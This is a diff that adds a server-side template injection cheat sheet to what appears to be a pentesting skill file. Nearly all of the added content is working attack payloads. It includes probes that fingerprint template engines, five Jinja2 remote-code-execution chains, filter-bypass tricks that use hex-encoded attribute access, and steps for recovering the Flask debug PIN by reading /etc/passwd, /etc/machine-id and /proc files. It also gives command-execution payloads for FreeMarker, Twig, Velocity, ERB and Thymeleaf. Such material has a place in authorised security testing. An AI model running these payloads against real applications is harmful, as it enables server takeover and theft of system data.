@@ -524,3 +524,110 @@ Remediation:
 
 - `references/payloads.md` — Per-engine payload cheatsheet
 - `references/tools.md` — tplmap, SSTImap, Burp extensions, Nuclei
+
+
+---
+
+## From hack-skills: SSTI Advanced Techniques
+
+### Engine Disambiguation
+
+```
+{{7*'7'}} → "7777777" = Jinja2  |  "49" = Twig
+${7*7}    → "49" = FreeMarker/Velocity/EL  |  "${7*7}" literal = not evaluated
+#{7*7}    → "49" = ERB  |  literal = not ERB
+@{7*7}    → "49" = Thymeleaf SpEL  |  literal = not Thymeleaf
+```
+
+### Engine → Language Mapping
+
+| Template Engine | Language | Key Indicator |
+|---|---|---|
+| Jinja2 | Python (Flask) | `{{7*'7'}}` = 7777777 |
+| Django | Python | `{% debug %}` shows context |
+| Mako | Python | `${7*7}` works |
+| Twig | PHP | `{{7*'7'}}` = 49 |
+| Smarty | PHP | `{$smarty.version}` |
+| FreeMarker | Java | `${7*7}` works |
+| Velocity | Java | `#set($x=7*7)$x` |
+| Pebble | Java | `{{ 7*7 }}` works |
+| Thymeleaf | Java | `[[${7*7}]]` works |
+| ERB | Ruby | `<%= 7*7 %>` |
+| Slim/Haml | Ruby | `= 7*7` |
+| Jade/Pug | Node.js | `= 7*7` |
+| Handlebars | Node.js | `{{7*7}}` returns literal (not eval) |
+| Tornado | Python | `{{ 7*7 }}` works |
+
+### Jinja2 RCE Chains
+
+```python
+# Chain 1: direct config globals
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# Chain 2: MRO subclass traversal (class index varies by app)
+{{''.__class__.__mro__[1].__subclasses__()[258]('id', shell=True, stdout=-1).communicate()[0]}}
+# Find correct index: {{''.__class__.__mro__[1].__subclasses__()}}
+
+# Chain 3: request object globals with hex encoding
+{{request.__class__.__init__.__globals__['\x6f\x73'].popen('id').read()}}
+
+# Chain 4: lipsum globals
+{{lipsum.__globals__.os.popen('id').read()}}
+
+# Chain 5: cycler globals
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+```
+
+### Jinja2 Sandbox Bypasses
+
+```python
+# Underscore blocked → use attr() with hex encoding:
+{{request|attr('\x5f\x5fclass\x5f\x5f')}}
+
+# Dot access blocked → use [] notation:
+{{request['__class__']}}
+
+# Keywords blocked → hex in attr():
+{{request|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')[1]|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
+```
+
+### Flask PIN Calculation (console access)
+
+Requires all of these from server:
+1. Username running Flask process (e.g., from `/proc/self/environ` or `/etc/passwd`)
+2. Module name: `flask.app`
+3. App path: absolute path to `app.py` (from error page or `/proc/self/cmdline`)
+4. MAC address in decimal (from `/sys/class/net/eth0/address` → convert to int)
+5. Machine-id (from `/etc/machine-id` or `/proc/sys/kernel/random/boot_id`)
+
+Then compute PIN using the Flask source algorithm (varies by Flask version — search `get_pin_and_cookie_name` in Flask source).
+
+### Other Engine Payloads
+
+```
+# FreeMarker:
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+# Twig 1.x:
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+# Twig 2.x:
+{{['id']|map('system')|join}}
+
+# Velocity:
+#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())
+#set($cmd=$rt.exec("id"))
+
+# ERB:
+<%= system('id') %>
+<%= `id` %>
+
+# Thymeleaf:
+__${T(java.lang.Runtime).getRuntime().exec("id")}__::type
+
+# AngularJS CSTI (client-side):
+{{constructor.constructor('alert(1)')()}}
+
+# Universal probe:
+${{<%[%'"}}%\.
+```
